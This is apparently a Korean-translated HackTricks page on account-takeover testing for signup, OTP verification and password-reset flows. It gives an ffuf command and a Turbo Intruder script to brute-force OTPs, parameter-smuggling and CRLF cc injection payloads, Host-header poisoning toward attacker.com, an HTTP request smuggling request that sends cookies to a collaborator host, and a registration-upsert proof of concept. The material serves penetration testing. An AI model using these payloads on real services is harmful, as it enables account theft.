# 등록 및 탈취 취약점

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- 기존 username을 사용해 생성을 시도해 보세요
- 이메일을 다양하게 바꿔 확인:
- 대문자(uppercase)
- +1@
- 이메일에 점 추가
- 이메일 이름 부분에 특수 문자 (%00, %09, %20)
- 이메일 뒤에 공백 문자 추가: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- 이메일 제공자 canonicalization 트릭 시도(서비스에 따라 다름):
- Gmail은 점과 subaddressing을 무시합니다: `victim+1@gmail.com`, `v.ic.tim@gmail.com` 는 `victim@gmail.com`으로 배달됩니다
- 일부 제공업체는 로컬 파트(local-part)를 대소문자 구분하지 않습니다
- 일부 제공업체는 unicode confusables를 허용합니다. 로컬 파트에 homoglyphs와 soft hyphen `\u00AD`를 시도해 보세요
- 이를 악용하여: 고유성 검사 우회, 중복 계정/workspace 초대 획득, 또는 탈취 준비 중 피해자 가입을 차단(일시적 DoS)할 수 있습니다

### Username Enumeration

애플리케이션 내에서 username이 이미 등록되어 있는지 확인할 수 있는지 검사하세요.

- 서로 다른 에러 메시지나 HTTP 상태 코드
- 시간 차이(존재하는 사용자일 경우 IdP/DB 조회가 트리거될 수 있음)
- 등록 폼에서 알려진 이메일에 대해 프로필 데이터를 자동 완성하는지 여부
- 팀/초대 흐름 확인: 이메일 입력 시 계정 존재 여부가 드러날 수 있음

### Password Policy

사용자 생성 시 비밀번호 정책을 확인하세요(약한 비밀번호 사용 가능 여부).\
그럴 경우 크리덴셜을 브루트포스 시도할 수 있습니다.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

등록된 상태에서 이메일을 변경해 보고 이 변경이 제대로 검증되는지, 아니면 임의의 이메일로 바꿀 수 있는지 확인하세요.

### More Checks

- **disposable emails** 사용 가능 여부 확인(mailinator, yopmail, 1secmail 등) 또는 `victim+mailinator@gmail.com` 같은 subaddressing으로 블랙리스트 우회
- **긴** **비밀번호**(>200)는 **DoS**로 이어질 수 있음
- **계정 생성 시 rate limit** 확인
- username@**burp_collab**.net 을 사용하고 **callback** 분석
- 전화번호 검증이 사용되는 경우, 전화번호 파싱/주입 엣지케이스 검사

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Weak Email/Phone Verification (OTP/Magic Link)

Registration 흐름은 종종 숫자 OTP 또는 magic-link 토큰으로 소유권을 검증합니다. 전형적인 결함:

- 추측 가능하거나 짧은 OTP(4–6자리)로 효과적인 rate limiting 또는 IP/디바이스 추적이 없음. 병렬 추측 및 헤더/IP 회전을 시도하세요.
- OTP가 액션이나 계정에 대해 재사용 가능하거나 특정 사용자/액션에 묶여 있지 않음(예: 동일한 코드가 로그인과 가입에 모두 작동하거나 이메일 변경 후에도 작동).
- Multi-value smuggling: 일부 백엔드는 여러 코드를 수용하고 어떤 것이든 일치하면 검증함. 시도:
- `code=000000&code=123456`
- JSON 배열: `{"code":["000000","123456"]}`
- 혼합된 파라미터 이름: `otp=000000&one_time_code=123456`
- 콤마/파이프 구분값: `code=000000,123456` 또는 `code=000000|123456`
- 응답 오라클: 잘못된 코드 vs 만료된 코드 vs 잘못된 사용자 코드를 상태/메시지/본문 길이로 구분
- 성공 후 또는 비밀번호/이메일 변경 후 토큰이 무효화되지 않음
- 검증 토큰이 user agent/IP에 묶여 있지 않아 공격자 제어 페이지에서 교차 출처로 완료 가능

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
순차적 차단(sequential lockouts)을 우회하기 위한 Parallel/concurrent guessing (Burp의 Turbo Intruder 사용):

<details>
<summary>Turbo Intruder 스니펫 — 6자리 OTP 시도를 대량으로 전송</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: 동일한 유효 OTP를 두 세션에서 동시에 제출해보세요; 때때로 한 세션이 공격자 계정으로 인증되면서 피해자 흐름도 성공합니다.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

공격자가 피해자가 계정을 만들기 전에 피해자의 이메일에 대해 조치를 취해두고 이후에 접근 권한을 확보하는 경우 강력한 취약점 군이 발생합니다.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
- all other sessions and tokens are invalidated,
- pending email/phone change capabilities are cancelled,
- previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. 자신의 이메일 주소로 password reset을 요청하세요.
2. password reset 링크를 클릭하세요.
3. 비밀번호를 변경하지 마세요.
4. 아무 3rd party 웹사이트(eg: Facebook, twitter)를 클릭하세요.
5. Burp Suite proxy에서 요청을 가로채세요.
6. referer header가 password reset token을 leak하는지 확인하세요.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suite에서 password reset 요청을 가로채세요.
2. Burp Suite에서 다음 헤더를 추가하거나 편집하세요: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 수정된 헤더로 요청을 전송하세요\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_를 기반으로 한 password reset URL을 찾으세요. 예: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### API Parameters에 대한 IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 공격자는 자신의 계정으로 로그인한 뒤 **비밀번호 변경** 기능으로 이동해야 합니다.
2. Burp Suite를 실행하고 요청을 가로챕니다
3. 요청을 repeater 탭으로 보내고 파라미터를 편집합니다 : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### 약한 Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

The password reset token should be randomly generated and unique every time.\
토큰이 만료되는지 또는 항상 같은지 여부를 확인해 보세요. 어떤 경우에는 생성 알고리즘이 약해서 예측될 수 있습니다. 알고리즘에 사용될 수 있는 변수는 다음과 같습니다.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 특정 이메일(예: test@mail.com)에 대해 API/UI를 사용해 password reset 요청을 트리거합니다.
2. 서버 응답을 검사하고 `resetToken`이 있는지 확인합니다.
3. 그런 다음 토큰을 다음과 같은 URL에 사용합니다: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Username Collision을 통한 Password Reset <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 피해자의 username과 동일하지만 username 앞뒤에 공백을 넣은 형태로 시스템에 등록합니다. 예: `"admin "`
2. 악의적인 username으로 password reset을 요청합니다.
3. 자신의 이메일로 전송된 token을 사용해 피해자의 비밀번호를 재설정합니다.
4. 새 비밀번호로 피해자 계정에 로그인합니다.

플랫폼 CTFd는 이 공격에 취약했습니다.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. 애플리케이션 내 또는 서브도메인에서 XSS를 찾습니다. 쿠키가 부모 도메인: `*.domain.com`에 스코프되어 있다면 서브도메인도 대상이 될 수 있습니다.
2. Leak the current **sessions cookie**
3. 해당 쿠키를 사용해 사용자로 인증합니다

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. **smuggler**를 사용해 HTTP Request Smuggling 유형(CL, TE, CL.TE)을 탐지합니다\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 다음 데이터로 `POST / HTTP/1.1`를 덮어쓸 요청을 구성합니다:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — 목표는 피해자들을 burpcollab으로 open redirect 시키고 그들의 cookies를 탈취하는 것입니다\
3. 최종 요청은 다음과 같을 수 있습니다
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone에서 이 버그를 악용한 보고서\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF를 통한 계정 탈취 <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF용 payload 생성, 예: “HTML form with auto submit for a password change”
2. payload 전송

### JWT를 통한 계정 탈취 <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token은 사용자 인증에 사용될 수 있다.

- 다른 User ID / Email로 JWT 수정
- 약한 JWT 서명 여부 확인


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

일부 signup handlers는 제공된 email이 이미 존재할 경우 upsert를 수행한다. 엔드포인트가 email과 password만 포함한 최소한의 body를 허용하고 소유권 검증을 강제하지 않으면 피해자의 email을 전송하는 것만으로 pre-auth 상태에서 그들의 비밀번호가 덮어써질 수 있다.

- Discovery: 번들된 JS(또는 모바일 앱 트래픽)에서 endpoint 이름을 수집한 다음 /parents/application/v4/admin/FUZZ 같은 기본 경로를 ffuf/dirsearch로 fuzz한다.
- Method hints: "Only POST request is allowed." 같은 메시지를 반환하는 GET 응답은 올바른 verb와 JSON body가 예상된다는 것을 나타내는 경우가 많다.
- 실제 환경에서 관찰된 최소 body:
```json
{"email":"victim@example.com","password":"New@12345"}
```
예제 PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
영향: Full Account Takeover (ATO) without any reset token, OTP, or email verification.

## 참고자료

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
